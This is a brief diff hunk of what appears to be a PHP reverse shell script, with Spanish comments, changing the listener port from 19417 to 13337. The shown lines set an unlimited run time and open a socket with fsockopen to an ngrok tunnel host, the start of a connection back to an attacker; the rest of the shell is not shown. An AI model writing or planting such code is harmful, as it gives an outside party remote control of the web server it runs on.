@@ -9,7 +9,7 @@ Author: Shur3
 
 set_time_limit(0);
 $ip = '0.tcp.sa.ngrok.io';   // La IP de ngrok
-$port = 19417;           	// El puerto de ngrok
+$port = 13337;           	// El puerto de ngrok
 
 $sock = fsockopen($ip, $port);
 if (!$sock) {
